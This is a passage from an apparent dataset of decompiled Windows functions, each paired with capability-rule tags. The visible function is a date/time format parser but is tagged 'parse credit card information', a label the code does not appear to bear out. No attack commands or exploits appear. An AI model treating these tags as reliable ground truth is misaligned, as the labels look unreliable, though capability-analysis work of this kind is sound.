*(arg1_00 + uVar22 + 0x139);\n                    if (uVar4 == 0) {\n                        uVar4 = uVar22;\n                        if (*(*arg1_00 + 0x40) != 0x140025c30) {\n                            uVar4 = (**(*arg1_00 + 0x40))(arg1_00);\n                        }\n                        if (uVar4 == 0x2a) goto code_r0x00014002ffcd;\n                        *(arg1_00 + uVar22 + 0x139) = uVar4;\n                    }\n                    piVar15 = uStack392;\n                    if (9 < uVar4 - 0x30) goto code_r0x00014002ffcd;\n                    uVar7 = (uVar4 - 0x30) + uStack364 * 10;\n                    puVar9 = uStack392[3];\n                    if (uStack392[2] < puVar9) {\n                        puVar16 = uStack392[2] + 1;\n                        uStack392[2] = puVar16;\n                    }\n                    else {\n                        (**(*uStack392 + 0x50))(uStack392);\n                        puVar16 = piVar15[2];\n                        puVar9 = piVar15[3];\n                    }\n                    uStack384 = 0xffffffff;\n                    uStack364 = uVar7;\n                    if (puVar16 < puVar9) {\n                        uVar8 = *puVar16;\n                    }\n                    else {\n                        uVar8 = (**(*piVar15 + 0x48))(piVar15);\n                        if (uVar8 == 0xffffffff) {\n                            uStack392 = NULL;\n                        }\n                    }\n                    if (((bVar18 != false) && (bVar17 = false,  piVar19[3] <= piVar19[2])) &&\n                       (iVar6 = (**(*piVar19 + 0x48))(piVar19),  iVar6 == -1)) {\n                        piVar19 = NULL;\n                        bVar17 = bVar18;\n                    }\n                    if (bVar17 != (uVar8 == 0xffffffff)) {\n                        uVar22 = fcn.140023fd0(&uStack392);\n                        uVar4 = *(arg1_00 + uVar22 + 0x139);\n                        if (uVar4 == 0) {\n                            uVar4 = uVar22;\n                            if (*(*arg1_00 + 0x40) != 0x140025c30) {\n                                uVar4 = (**(*arg1_00 + 0x40))(arg1_00);\n                            }\n                            if (uVar4 == 0x2a) goto code_r0x000140030252;\n                            *(arg1_00 + uVar22 + 0x139) = uVar4;\n                        }\n                        if (uVar4 - 0x30 < 10) {\n                            if (uStack392[2] < uStack392[3]) {\n                                uStack392[2] = uStack392[2] + 1;\n                            }\n                            else {\n                                (**(*uStack392 + 0x50))(uStack392);\n                            }\n                            uStack384 = 0xffffffff;\n                            uStack364 = (uVar4 - 0x30) + uVar7 * 10;\n                        }\n                    }\ncode_r0x000140030252:\n                    *(in_stack_00000048 + 1) = *(in_stack_00000048 + 1) & 0xfd;\n                    uVar7 = uStack364 - 0x76c;\n                }\n                uVar11 = uStack384;\n                in_stack_00000038[5] = uVar7;\n                piVar15 = uStack392;\n                piVar25 = arg_80h;\n            }\n            else {\n                uVar11 = uStack400;\n                piVar15 = piStack408;\n                piVar25 = arg_80h;\n            }\n        }\ncode_r0x00014002e457:\n        uVar13 = uVar14 + 1;\n    }\n    if ((uVar13 == noname_10) && (uVar23 == 0)) goto code_r0x00014002e678;\ncode_r0x00014002e675:\n    *in_stack_00000030 = *in_stack_00000030 | 4;\ncode_r0x00014002e678:\n    *arg1 = uStack392;\n    arg1[1] = uStack392._4_4_;\n    arg1[2] = uStack384;\n    arg1[3] = uStack380;\n    return arg1;\n}\n",
        "token_count": 13235
    },
    "140033e9": {
        "rules": [
            "parse credit card information/3266979fad224c5386fccfb7f2b301b7"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * fcn.140033e90(uint *arg1, ulong arg2, int64_t **noname_2, int64_t **arg4)\n\n{\n    int64_t iVar1;\n    char cVar2;\n    uint8_t uVar3;\n    uint8_t uVar4;\n    bool bVar5;\n    uint16_t uVar6;\n    int16_t iVar7;\n    int16_t iVar8;\n    uint16_t uVar9;\n    int64_t arg_90h;\n    int64_t *piVar10;\n    uint64_t arg_78h;\n    int16_t *piVar11;\n    int16_t *piVar12;\n    bool bVar13;\n    uint32_t uVar14;\n    int64_t *piVar15;\n    int64_t *piVar16;\n    bool bVar17;\n    bool bVar18;\n    uint8_t uVar19;\n    bool bVar20;\n    int64_t in_stack_00000028;\n    uint32_t *in_stack_00000030;\n    uint32_t *in_stack_00000038;\n    ulong in_stack_00000040;\n    uint32_t *in_stack_00000048;\n    uint32_t *in_stack_fffffffffffffe00;\n    uint32_t *noname_8;\n    ulong in_stack_fffffffffffffe08;\n    uint64_t noname_11;\n    uint in_stack_fffffffffffffe18;\n    uint32_t uVar21;\n    uint *in_stack_fffffffffffffe28;\n    int64_t *arg_88h;\n    int64_t *arg_88h_00;\n    int64_t *piStack440;\n    int64_t *piStack432;\n    uint uStack424;\n    uint uStack420;\n    uint32_t uStack416;\n    uint uStack412;\n    int64_t *piStack408;\n    uint16_t uStack400;\n    ulong uStack392;\n    uint uStack384;\n    uint uStack380;\n    uint32_t uStack368;\n    uint32_t uStack364;\n    int16_t *piStack360;\n    int16_t *piStack352;\n    uint uStack344;\n    uint uStack340;\n    uint uStack336;\n    uint uStack332;\n    uint uStack328;\n    uint uStack324;\n    uint uStack320;\n    uint uStack316;\n    uint uStack312;\n    uint uStack308;\n    uint uStack304;\n    uint uStack300;\n    uint uStack296;\n    uint uStack292;\n    uint uStack288;\n    uint uStack284;\n    uint uStack280;\n    uint uStack276;\n    uint uStack272;\n    uint uStack268;\n    uint uStack264;\n    uint uStack260;\n    uint uStack256;\n    uint uStack252;\n    uint uStack248;\n    uint uStack244;\n    uint uStack240;\n    uint uStack236;\n    uint uStack232;\n    uint uStack228;\n    uint uStack224;\n    uint uStack220;\n    uint uStack216;\n    uint uStack212;\n    uint uStack208;\n    uint uStack204;\n    uint uStack200;\n    uint uStack196;\n    uint uStack192;\n    uint uStack188;\n    uint uStack184;\n    uint uStack180;\n    uint uStack176;\n    uint uStack172;\n    \n    piVar16 = arg4[1];\n    uStack392 = *noname_2;\n    uStack384 = *(noname_2 + 1);\n    uStack380 = *(noname_2 + 0xc);\n    piVar15 = *arg4;\n    arg_88h = piVar16;\n    arg_90h = fcn.1400b3640(in_stack_00000028 + 0xd0);\n    piVar10 = fcn.1400b3700(in_stack_00000028 + 0xd0);\n    arg_78h = sub.msvcrt.dll_wcslen(in_stack_00000040);\n    bVar17 = piVar16 == -1;\n    noname_11 = 0;\n    bVar18 = uStack384 == 0xffff;\n    uStack368 = 0;\n    uVar21 = 0;\n    if ((uStack392 != NULL) && (piVar16 = uStack392,  bVar20 = bVar18,  bVar18)) goto code_r0x0001400340e1;\ncode_r0x000140033fa0:\n    bVar13 = piVar15 != NULL && bVar17;\n    bVar20 = bVar18;\n    if (bVar13) goto code_r0x000140034118;\ncode_r0x000140033fb3:\n    if (bVar18 == bVar17) {\ncode_r0x000140034150:\n        if ((noname_11 != arg_78h) || (uVar21 != 0)) {\ncode_r0x000140034177:\n            *in_stack_00000030 = *in_stack_00000030 | 4;\n        }\n        *arg1 = uStack392;\n        arg1[1] = uStack392._4_4_;\n        arg1[2] = uStack384;\n        arg1[3] = uStack380;\n        return arg1;\n    }\n    do {\n        if (arg_78h <= noname_11) goto code_r0x000140034150;\n        if (uVar21 != 0) goto code_r0x000140034177;\n        cVar2 = (**(*piVar10 + 0x60))(piVar10);\n        if (cVar2 != '%') {\n            cVar2 = (**(*piVar10 + 0x10))(piVar10);\n            piVar16 = uStack392;\n            if (cVar2 == '\\0') {\n                bVar18 = uStack392 != NULL;\n                uVar6 = (**(*piVar10 + 0x40))(piVar10);\n                in_stack_fffffffffffffe28 = in_stack_fffffffffffffe28 & 0xffffffffffff0000 | uVar6;\n                bVar13 = bVar20 & bVar18;\n                if (bVar13 != false) {\n                    if (piVar16[2] < piVar16[3]) {\n                        iVar7 = *piVar16[2];\n                    }\n                    else {\n                        iVar7 = (**(*piVar16 + 0x48))(piVar16);\n                    }\n                    bVar18 = bVar13;\n                    if (iVar7 == -1) {\n                        uStack392 = NULL;\n                        bVar18 = false;\n                        piVar16 = NULL;\n                    }\n                }\n                iVar7 = (**(*piVar10 + 0x40))(piVar10);\n                if (in_stack_fffffffffffffe28 != iVar7) {\n                    iVar7 = (**(*piVar10 + 0x30))(piVar10);\n                    if ((bVar20 != false) && (bVar18 != false)) {\n                        if (piVar16[2] < piVar16[3]) {\n                            iVar8 = *piVar16[2];\n                        }\n                        else {\n                            iVar8 = (**(*piVar16 + 0x48))(piVar16);\n                        }\n                        if (iVar8 == -1) {\n                            uStack392 = NULL;\n                        }\n                    }\n                    iVar8 = (**(*piVar10 + 0x30))(piVar10);\n                    piVar16 = uStack392;\n                    arg_88h_00 = arg_88h;\n                    if (iVar7 != iVar8) goto code_r0x0001400340a6;\n                }\ncode_r0x000140034240:\n                if (piVar16[2] < piVar16[3]) {\n                    piVar16[2] = piVar16[2] + 2;\n                }\n                else {\n                    (**(*piVar16 + 0x50))(piVar16);\n                }\n                uStack384 = CONCAT22(uStack384._2_2_, 0xffff);\n                uStack384._0_2_ = 0xffff;\n            }\n            else {\n                while( true ) {\n                    uVar19 = uStack384 == 0xffff;\n                    uVar3 = piVar16 != NULL && uVar19;\n                    if (piVar16 != NULL && uVar19) {\n                        if (piVar16[2] < piVar16[3]) {\n                            iVar7 = *piVar16[2];\n                        }\n                        else {\n                            in_stack_fffffffffffffe28 = in_stack_fffffffffffffe28 & 0xffffffffffffff00 | uVar3;\n                            iVar7 = (**(*piVar16 + 0x48))(piVar16);\n                            uVar3 = in_stack_fffffffffffffe28;\n                        }\n                        uVar19 = 0;\n                        if (iVar7 == -1) {\n                            piVar16 = NULL;\n                            uStack392 = NULL;\n                            uVar19 = uVar3;\n                            uVar3 = 0;\n                        }\n                    }\n                    bVar18 = piVar15 != NULL && bVar17;\n                    bVar20 = bVar17;\n                    if (bVar18) {\n                        if (piVar15[2] < piVar15[3]) {\n                            iVar7 = *piVar15[2];\n                        }\n                        else {\n                            in_stack_fffffffffffffe28 = in_stack_fffffffffffffe28 & 0xffffffffffffff00 | uVar3;\n                            iVar7 = (**(*piVar15 + 0x48))(piVar15);\n                            uVar3 = in_stack_fffffffffffffe28;\n                        }\n                        bVar20 = false;\n                        if (iVar7 == -1) {\n                            piVar15 = NULL;\n                            bVar20 = bVar18;\n                        }\n                    }\n                    if (uVar19 == bVar20) break;\n                    if (uVar3 != 0) {\n                        if (piVar16[2] < piVar16[3]) {\n                            iVar7 = *piVar16[2];\n                        }\n                        else {\n                            iVar7 = (**(*piVar16 + 0x48))(piVar16);\n                        }\n                        if (iVar7 == -1) {\n                            uStack392 = NULL;\n                            piVar16 = NULL;\n                        }\n                    }\n                    cVar2 = (**(*piVar10 + 0x10))(piVar10);\n                    if (cVar2 == '\\0') break;\n                    if (piVar16[2] < piVar16[3]) {\n                        piVar16[2] = piVar16[2] + 2;\n                    }\n                    else {\n                        (**(*piVar16 + 0x50))(piVar16);\n                    }\n                    uStack384._0_2_ = 0xffff;\n                    uStack384 = CONCAT22(uStack384._2_2_, 0xffff);\n                }\n            }\n            goto code_r0x0001400340c1;\n        }\n        cVar2 = (**(*piVar10 + 0x60))(piVar10);\n        uStack364 = 0;\n        if ((cVar2 == 'E') || (cVar2 == 'O')) {\n            noname_11 = noname_11 + 2;\n            cVar2 = (**(*piVar10 + 0x60))(piVar10);\n        }\n        else {\n            noname_11 = noname_11 + 1;\n        }\n        piVar16 = uStack392;\n        bVar18 = piVar15 != NULL && bVar17;\n        arg_88h_00 = arg_88h;\n    // switch table (85 cases) at 0x1400fe1bc\n        switch(cVar2 + -0x25) {\n        case '\\0':\n            uVar6 = uStack384;\n            if ((uStack392 != NULL) && (bVar20 != false)) {\n                if (uStack392[2] < uStack392[3]) {\n                    uVar6 = *uStack392[2];\n                }\n                else {\n                    uVar6 = (**(*uStack392 + 0x48))(uStack392);\n                }\n                if (uVar6 == 0xffff) {\n                    uStack392 = NULL;\n                    piVar16 = NULL;\n                }\n            }\n            uVar9 = (**(*piVar10 + 0x50))(piVar10);\n            if (uVar9 == uVar6) goto code_r0x000140034240;\n            uStack368 = 4;\n            uVar21 = 4;\n            break;\n        default:\ncode_r0x0001400340a6:\n            uStack368 = 4;\n            piVar16 = uStack392;\n            uVar21 = 4;\n            arg_88h = arg_88h_00;\n            break;\n        case '\\x1c':\n        case '<':\n            iVar1 = *(arg_90h + 0x10);\n            uStack280 = *(iVar1 + 0xa8);\n            uStack276 = *(iVar1 + 0xac);\n            uStack272 = *(iVar1 + 0xb0);\n            uStack268 = *(iVar1 + 0xb4);\n            uStack344 = *(iVar1 + 0x68);\n            uStack340 = *(iVar1 + 0x6c);\n            uStack336 = *(iVar1 + 0x70);\n            uStack332 = *(iVar1 + 0x74);\n            uStack328 = *(iVar1 + 0x78);\n            uStack324 = *(iVar1 + 0x7c);\n            uStack320 = *(iVar1 + 0x80);\n            uStack316 = *(iVar1 + 0x84);\n            uStack312 = *(iVar1 + 0x88);\n            uStack308 = *(iVar1 + 0x8c);\n            uStack304 = *(iVar1 + 0x90);\n            uStack300 = *(iVar1 + 0x94);\n            uStack296 = *(iVar1 + 0x98);\n            uStack292 = *(iVar1 + 0x9c);\n            uStack288 = *(iVar1 + 0xa0);\n            uStack284 = *(iVar1 + 0xa4);\n            uStack264 = *(iVar1 + 0xb8);\n            uStack260 = *(iVar1 + 0xbc);\n            uStack256 = *(iVar1 + 0xc0);\n            uStack252 = *(iVar1 + 0xc4);\n            piStack360 = *(iVar1 + 0x58);\n            piStack352 = *(iVar1 + 0x60);\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar15;\n            piStack432 = arg_88h;\n            fcn.140032f70(&piStack408, arg2, &uStack424, &piStack440, &uStack364, &piStack360, 0xe, in_stack_00000028, \n                          &uStack368, in_stack_fffffffffffffe00, in_stack_fffffffffffffe08, noname_11, \n                          CONCAT44(uVar21, in_stack_fffffffffffffe18), arg_78h, in_stack_fffffffffffffe28, arg_88h, \n                          arg_90h);\n            uStack392 = piStack408;\n            uStack384 = uStack384 & 0xffff0000 | uStack400;\n            piVar16 = piStack408;\n            uStack384._0_2_ = uStack400;\n            uVar21 = uStack368;\n            if (uStack368 == 0) {\n                in_stack_00000038[6] = uStack364 % 7;\n                *in_stack_00000048 = *in_stack_00000048 | 2;\n                piVar16 = piStack408;\n            }\n            break;\n        case '\\x1d':\n        case '=':\n        case 'C':\n            iVar1 = *(arg_90h + 0x10);\n            uStack216 = *(iVar1 + 0x158);\n            uStack212 = *(iVar1 + 0x15c);\n            uStack208 = *(iVar1 + 0x160);\n            uStack204 = *(iVar1 + 0x164);\n            uStack264 = *(iVar1 + 0x128);\n            uStack260 = *(iVar1 + 300);\n            uStack256 = *(iVar1 + 0x130);\n            uStack252 = *(iVar1 + 0x134);\n            uStack248 = *(iVar1 + 0x138);\n            uStack244 = *(iVar1 + 0x13c);\n            uStack240 = *(iVar1 + 0x140);\n            uStack236 = *(iVar1 + 0x144);\n            uStack232 = *(iVar1 + 0x148);\n            uStack228 = *(iVar1 + 0x14c);\n            uStack224 = *(iVar1 + 0x150);\n            uStack220 = *(iVar1 + 0x154);\n            uStack200 = *(iVar1 + 0x168);\n            uStack196 = *(iVar1 + 0x16c);\n            uStack192 = *(iVar1 + 0x170);\n            uStack188 = *(iVar1 + 0x174);\n            uStack184 = *(iVar1 + 0x178);\n            uStack180 = *(iVar1 + 0x17c);\n            uStack176 = *(iVar1 + 0x180);\n            uStack172 = *(iVar1 + 0x184);\n            uStack296 = *(iVar1 + 0x108);\n            uStack292 = *(iVar1 + 0x10c);\n            uStack288 = *(iVar1 + 0x110);\n            uStack284 = *(iVar1 + 0x114);\n            uStack280 = *(iVar1 + 0x118);\n            uStack276 = *(iVar1 + 0x11c);\n            uStack272 = *(iVar1 + 0x120);\n            uStack268 = *(iVar1 + 0x124);\n            uStack344 = *(iVar1 + 0xd8);\n            uStack340 = *(iVar1 + 0xdc);\n            uStack336 = *(iVar1 + 0xe0);\n            uStack332 = *(iVar1 + 0xe4);\n            uStack328 = *(iVar1 + 0xe8);\n            uStack324 = *(iVar1 + 0xec);\n            uStack320 = *(iVar1 + 0xf0);\n            uStack316 = *(iVar1 + 0xf4);\n            uStack312 = *(iVar1 + 0xf8);\n            uStack308 = *(iVar1 + 0xfc);\n            uStack304 = *(iVar1 + 0x100);\n            uStack300 = *(iVar1 + 0x104);\n            piStack360 = *(iVar1 + 200);\n            piStack352 = *(iVar1 + 0xd0);\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar15;\n            piStack432 = arg_88h;\n            fcn.140032f70(&piStack408, arg2, &uStack424, &piStack440, &uStack364, &piStack360, 0x18, in_stack_00000028, \n                          &uStack368, in_stack_fffffffffffffe00, in_stack_fffffffffffffe08, noname_11, \n                          CONCAT44(uVar21, in_stack_fffffffffffffe18), arg_78h, in_stack_fffffffffffffe28, arg_88h, \n                          arg_90h);\n            uStack392 = piStack408;\n            uStack384 = uStack384 & 0xffff0000 | uStack400;\n            piVar16 = piStack408;\n            uStack384._0_2_ = uStack400;\n            uVar21 = uStack368;\n            if (uStack368 == 0) {\n                in_stack_00000038[4] = uStack364 % 0xc;\n                *in_stack_00000048 = *in_stack_00000048 | 0x408;\n                piVar16 = piStack408;\n            }\n            break;\n        case '\\x1e':\n            in_stack_fffffffffffffe00 = &uStack368;\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar15;\n            piStack432 = arg_88h;\n            fcn.140032a40(&piStack408, arg2, &uStack424, &piStack440);\n            uStack392 = piStack408;\n            uStack384 = uStack384 & 0xffff0000 | uStack400;\n            piVar16 = piStack408;\n            uStack384._0_2_ = uStack400;\n            uVar21 = uStack368;\n            if (uStack368 == 0) {\n                *in_stack_00000048 = *in_stack_00000048 | 0x480;\n                in_stack_00000048[1] = uStack364;\n                piVar16 = piStack408;\n            }\n            break;\n        case '\\x1f':\n            (**(*piVar10 + 0x58))(piVar10, 0x1400fe1a4, 0x1400fe1ad, &piStack360);\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            goto code_r0x000140035328;\n        case '#':\n            in_stack_fffffffffffffe00 = &uStack368;\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar15;\n            piStack432 = arg_88h;\n            fcn.140032a40(&piStack408, arg2, &uStack424, &piStack440);\n            uStack392 = piStack408;\n            uStack384 = uStack384 & 0xffff0000 | uStack400;\n            piVar16 = piStack408;\n            uStack384._0_2_ = uStack400;\n            uVar21 = uStack368;\n            if (uStack368 == 0) {\n                in_stack_00000038[2] = uStack364;\n                *in_stack_00000048 = *in_stack_00000048 & 0xfe;\n                piVar16 = piStack408;\n            }\n            break;\n        case '$':\n            in_stack_fffffffffffffe00 = &uStack368;\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar15;\n            piStack432 = arg_88h;\n            fcn.140032a40(&piStack408, arg2, &uStack424, &piStack440);\n            uStack392 = piStack408;\n            uStack384 = uStack384 & 0xffff0000 | uStack400;\n            piVar16 = piStack408;\n            uStack384._0_2_ = uStack400;\n            uVar21 = uStack368;\n            if (uStack368 == 0) {\n                in_stack_00000038[2] = uStack364 % 0xc;\n                *in_stack_00000048 = *in_stack_00000048 | 1;\n                piVar16 = piStack408;\n            }\n            break;\n        case '(':\n            in_stack_fffffffffffffe00 = &uStack368;\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar15;\n            piStack432 = arg_88h;\n            fcn.140032a40(&piStack408, arg2, &uStack424, &piStack440);\n            uStack392 = piStack408;\n            uStack384 = uStack384 & 0xffff0000 | uStack400;\n            piVar16 = piStack408;\n            uStack384._0_2_ = uStack400;\n            uVar21 = uStack368;\n            if (uStack368 == 0) {\n                in_stack_00000038[1] = uStack364;\n                piVar16 = piStack408;\n            }\n            break;\n        case '-':\n            (**(*piVar10 + 0x58))(piVar10, 0x1400fe1ad, 0x1400fe1b3, &piStack360);\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            goto code_r0x000140034cd2;\n        case '.':\n            in_stack_fffffffffffffe00 = &uStack368;\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar15;\n            piStack432 = arg_88h;\n            fcn.140032a40(&piStack408, arg2, &uStack424, &piStack440);\n            uStack392 = piStack408;\n            uStack384 = uStack384 & 0xffff0000 | uStack400;\n            piVar16 = piStack408;\n            uStack384._0_2_ = uStack400;\n            uVar21 = uStack368;\n            if (uStack368 == 0) {\n                *in_stack_00000038 = uStack364;\n                piVar16 = piStack408;\n            }\n            break;\n        case '/':\n            (**(*piVar10 + 0x58))(piVar10, 0x1400fe1b3, 0x1400fe1bc, &piStack360);\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            goto code_r0x000140034cd2;\n        case '0':\n            in_stack_fffffffffffffe00 = &uStack368;\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar15;\n            piStack432 = arg_88h;\n            fcn.140032a40(&piStack408, arg2, &uStack424, &piStack440);\n            uStack392 = piStack408;\n            uStack384 = uStack384 & 0xffff0000 | uStack400;\n            piVar16 = piStack408;\n            uStack384._0_2_ = uStack400;\n            uVar21 = uStack368;\n            if (uStack368 == 0) {\n                in_stack_fffffffffffffe28 = in_stack_fffffffffffffe28 & 0xffffffff00000000 | *in_stack_00000048;\n                *in_stack_00000048 = (uStack364 & 0x3f) << 0x10 | 0x20 | *in_stack_00000048 & 0xffc0ffdf;\n                piVar16 = piStack408;\n            }\n            break;\n        case '2':\n            in_stack_fffffffffffffe00 = &uStack368;\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar15;\n            piStack432 = arg_88h;\n            fcn.140032a40(&piStack408, arg2, &uStack424, &piStack440);\n            uStack392 = piStack408;\n            uStack384 = uStack384 & 0xffff0000 | uStack400;\n            piVar16 = piStack408;\n            uStack384._0_2_ = uStack400;\n            uVar21 = uStack368;\n            if (uStack368 == 0) {\n                in_stack_fffffffffffffe28 = in_stack_fffffffffffffe28 & 0xffffffff00000000 | *in_stack_00000048;\n                *in_stack_00000048 = (uStack364 & 0x3f) << 0x10 | 0x40 | *in_stack_00000048 & 0xffc0ffbf;\n                piVar16 = piStack408;\n            }\n            break;\n        case '3':\n            goto code_r0x000140035060;\n        case '4':\n            in_stack_fffffffffffffe00 = &uStack368;\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar15;\n            piStack432 = arg_88h;\n            fcn.140032a40(&piStack408, arg2, &uStack424, &piStack440);\n            uStack392 = piStack408;\n            uStack384 = uStack384 & 0xffff0000 | uStack400;\n            piVar16 = piStack408;\n            uStack384._0_2_ = uStack400;\n            uVar21 = uStack368;\n            if (uStack368 == 0) {\n                in_stack_00000038[5] = uStack364 - 0x76c;\n                in_stack_fffffffffffffe28 = in_stack_fffffffffffffe28 & 0xffffffffffffff00 | *(in_stack_00000048 + 1);\n                *(in_stack_00000048 + 1) = *(in_stack_00000048 + 1) & 0xf9 | 4;\n                piVar16 = piStack408;\n            }\n            break;\n        case '5':\n            if ((uStack392 != NULL) && (bVar20 != false)) {\n                if (uStack392[2] < uStack392[3]) {\n                    iVar7 = *uStack392[2];\n                }\n                else {\n                    iVar7 = (**(*uStack392 + 0x48))();\n                }\n                arg_88h_00 = arg_88h;\n                if (iVar7 == -1) {\n                    uStack392 = NULL;\n                }\n            }\n            cVar2 = (**(*piVar10 + 0x10))(piVar10);\n            if (cVar2 == '\\0') goto code_r0x0001400340a6;\n            noname_8 = &uStack368;\n            in_stack_fffffffffffffe28 = &uStack424;\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar15;\n            piStack432 = arg_88h_00;\n            fcn.140032f70(&piStack408, arg2, in_stack_fffffffffffffe28, &piStack440, &piStack360, *0x140102cf0, 0xe, \n                          in_stack_00000028, noname_8, in_stack_fffffffffffffe00, in_stack_fffffffffffffe08, noname_11, \n                          CONCAT44(uVar21, in_stack_fffffffffffffe18), arg_78h, in_stack_fffffffffffffe28, arg_88h_00, \n                          arg_90h);\n            uStack384._0_2_ = uStack400;\n            cVar2 = uStack400 == 0xffff;\n            uStack392 = piStack408;\n            uStack384 = uStack384 & 0xffff0000 | uStack400;\n            if ((piStack408 != NULL) && (cVar2)) {\n                if (piStack408[2] < piStack408[3]) {\n                    iVar7 = *piStack408[2];\n                }\n                else {\n                    iVar7 = (**(*piStack408 + 0x48))();\n                }\n                if (iVar7 == -1) {\n                    uStack392 = NULL;\n                }\n                cVar2 = iVar7 == -1;\n            }\n            bVar20 = bVar17;\n            if (bVar18) {\n                if (piVar15[2] < piVar15[3]) {\n                    iVar7 = *piVar15[2];\n                }\n                else {\n                    iVar7 = (**(*piVar15 + 0x48))(piVar15);\n                }\n                bVar20 = iVar7 == -1 && bVar18;\n                if (iVar7 == -1) {\n                    piVar15 = NULL;\n                }\n            }\n            piVar16 = uStack392;\n            uVar21 = uStack368;\n            arg_88h = arg_88h_00;\n            if ((cVar2 != bVar20) && ((uStack368 | piStack360) == 0)) {\n                iVar7 = fcn.1400240d0(&uStack392);\n                iVar8 = (**(*piVar10 + 0x50))(piVar10, 0x2d);\n                if (iVar7 != iVar8) {\n                    iVar7 = fcn.1400240d0(&uStack392);\n                    iVar8 = (**(*piVar10 + 0x50))(piVar10);\n                    if (iVar7 != iVar8) {\n                        piVar16 = uStack392;\n                        uStack384._0_2_ = uStack384;\n                        uVar21 = 0;\n                        arg_88h = arg_88h_00;\n                        break;\n                    }\n                }\n                uStack424 = uStack392;\n                uStack420 = uStack392._4_4_;\n                uStack416 = uStack384;\n                uStack412 = uStack380;\n                arg_88h = arg_88h_00;\n                piStack440 = piVar15;\n                piStack432 = arg_88h_00;\n                fcn.140032a40(&piStack408, arg2, in_stack_fffffffffffffe28, &piStack440);\n                uStack384 = uStack384 & 0xffff0000 | uStack400;\n                uStack392 = piStack408;\n                uStack392._0_4_ = SUB84(piStack408, 0);\n                uStack392._4_4_ = piStack408 >> 0x20;\n                uStack424 = uStack392;\n                uStack420 = uStack392._4_4_;\n                uStack416 = uStack384;\n                uStack412 = uStack380;\n                piStack440 = piVar15;\n                piStack432 = arg_88h_00;\n                fcn.140032a40(&piStack408, arg2, in_stack_fffffffffffffe28, &piStack440);\n                uStack392 = piStack408;\n                uStack384 = uStack384 & 0xffff0000 | uStack400;\n                piVar16 = piStack408;\n                uStack384._0_2_ = uStack400;\n                in_stack_fffffffffffffe00 = noname_8;\n                uVar21 = uStack368;\n            }\n            break;\n        case '>':\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\ncode_r0x000140035328:\n            piStack440 = piVar15;\n            piStack432 = arg_88h;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            fcn.140033e90(&piStack408, arg2, &uStack424, &piStack440);\n            uStack392 = piStack408;\n            uStack384 = uStack384 & 0xffff0000 | uStack400;\n            piVar16 = piStack408;\n            uStack384._0_2_ = uStack400;\n            uVar21 = uStack368;\n            if (uStack368 == 0) {\n                *(in_stack_00000048 + 1) = *(in_stack_00000048 + 1) | 4;\n                piVar16 = piStack408;\n            }\n            break;\n        case '?':\n        case '@':\n            if ((uStack392 != NULL) && (bVar20 != false)) {\n                if (uStack392[2] < uStack392[3]) {\n                    uStack384._0_2_ = *uStack392[2];\n                }\n                else {\n                    uStack384._0_2_ = (**(*uStack392 + 0x48))();\n                }\n                if (uStack384 == 0xffff) {\n                    uStack392 = NULL;\n                }\n            }\n            cVar2 = (**(*piVar10 + 0x10))(piVar10, 0x20, uStack384);\n            if (cVar2 != '\\0') {\n                if (uStack392[2] < uStack392[3]) {\n                    uStack392[2] = uStack392[2] + 2;\n                }\n                else {\n                    (**(*uStack392 + 0x50))();\n                }\n                uStack384 = CONCAT22(uStack384._2_2_, 0xffff);\n            }\n            in_stack_fffffffffffffe00 = &uStack368;\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar15;\n            piStack432 = arg_88h;\n            fcn.140032a40(&piStack408, arg2, &uStack424, &piStack440);\n            uStack392 = piStack408;\n            uStack384 = uStack384 & 0xffff0000 | uStack400;\n            piVar16 = piStack408;\n            uStack384._0_2_ = uStack400;\n            uVar21 = uStack368;\n            if (uStack368 == 0) {\n                in_stack_00000038[3] = uStack364;\n                *in_stack_00000048 = *in_stack_00000048 | 0x410;\n                piVar16 = piStack408;\n            }\n            break;\n        case 'E':\n            in_stack_fffffffffffffe00 = &uStack368;\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar15;\n            piStack432 = arg_88h;\n            fcn.140032a40(&piStack408, arg2, &uStack424, &piStack440);\n            uStack392 = piStack408;\n            uStack384 = uStack384 & 0xffff0000 | uStack400;\n            piVar16 = piStack408;\n            uStack384._0_2_ = uStack400;\n            uVar21 = uStack368;\n            if (uStack368 == 0) {\n                in_stack_00000038[7] = uStack364 - 1;\n                *in_stack_00000048 = *in_stack_00000048 | 4;\n                piVar16 = piStack408;\n            }\n            break;\n        case 'H':\n            in_stack_fffffffffffffe00 = &uStack368;\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            